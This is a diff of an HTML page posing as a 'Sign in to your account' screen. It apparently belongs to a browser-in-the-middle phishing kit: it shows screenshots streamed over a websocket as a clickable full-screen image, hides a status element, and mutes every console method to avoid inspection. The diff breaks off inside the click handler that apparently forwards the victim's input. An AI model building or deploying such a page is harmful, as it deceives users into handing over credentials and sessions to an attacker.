@@ -4,75 +4,28 @@
     <meta charset="UTF-8">
     <title>Sign in to your account</title>
     <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p6DQAAAAFzUkdCAK7OHOkAAAAEZ0FNQQAAsPV8L3GVAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAZ0lEQVRYhe2W0QoAIAhD7f8/unvYQ6clS7pgHwaatpXpYpSImYmJiYmJiYmJiYmJiYmJicloZp6at6Lp9ZqZp+ataHq9Zual+SuaXq+ZeWn+iqbXa2Zemr+i6fWamZfmr2h6vWbmf7Ef570vS87pL9AAAAAASUVORK5CYII=">
-    <link rel="shortcut icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p6DQAAAAFzUkdCAK7OHOkAAAAEZ0FNQQAAsPV8L3GVAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAZ0lEQVRYhe2W0QoAIAhD7f8/unvYQ6clS7pgHwaatpXpYpSImYmJiYmJiYmJiYmJiYmJicloZp6at6Lp9ZqZp+ataHq9Zual+SuaXq+ZeWn+iqbXa2Zemr+i6fWamZfmr2h6vWbmf7Ef570vS87pL9AAAAAASUVORK5CYII=">
-    
     <style>
-        body { background: #000; color: #000; font-family: monospace; display: flex; flex-direction: column; align-items: center; margin: 0; overflow: hidden; }
-        
-        /* Cloaked Status Bar: Present for logic, invisible to user */
-        .status-bar { 
-            width: 100%; 
-            background: #000; 
-            padding: 2px; 
-            font-size: 1px; 
-            opacity: 0; 
-            pointer-events: none;
-        }
-
-        #mirror { 
-            width: 100vw; 
-            height: auto; 
-            cursor: crosshair; 
-            image-rendering: -webkit-optimize-contrast; 
-            -webkit-user-drag: none; 
-            user-select: none; 
-            -webkit-user-select: none; 
-        }
-
-        .hint { 
-            position: absolute;
-            bottom: 10px;
-            font-size: 10px; 
-            color: #111; /* Extremely dark, blends into background */
-            letter-spacing: 1px; 
-        }
+        body { background: #000; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: flex-start; }
+        #mirror { width: 100vw; height: auto; cursor: crosshair; -webkit-user-drag: none; user-select: none; }
+        .status-bar { position: absolute; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
-    <div class="status-bar">
-        STATUS: <span id="msg">IDLE</span>
-    </div>
-    
+    <div class="status-bar"><span id="msg">IDLE</span></div>
     <img id="mirror" src="" draggable="false" />
-    
 
-
-    <script src="/socket.io/socket.io.js"></script>
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
     <script>
-        // Mute Console
         (function() {
             const noop = () => {};
             ['log', 'debug', 'info', 'warn', 'error'].forEach(m => window.console[m] = noop);
         })();
 
-        const socket = io({ 
-            transports: ['websocket'], 
-            upgrade: false,
-            reconnection: true 
-        });
-
+        const socket = io({ transports: ['websocket'], upgrade: false });
         const img = document.getElementById('mirror');
-        const status = document.getElementById('msg');
-
-        socket.on('connect', () => {
-            status.innerText = "ACTIVE";
-            setInterval(() => { socket.emit('heartbeat', { ts: Date.now() }); }, 20000);
-        });
 
         socket.on('browser-render', (data) => {
-            if (data.screenshot) {
-                img.src = 'data:image/jpeg;base64,' + data.screenshot;
-            }
+            if (data.screenshot) img.src = 'data:image/jpeg;base64,' + data.screenshot;
         });
 
         img.addEventListener('click', (e) => {
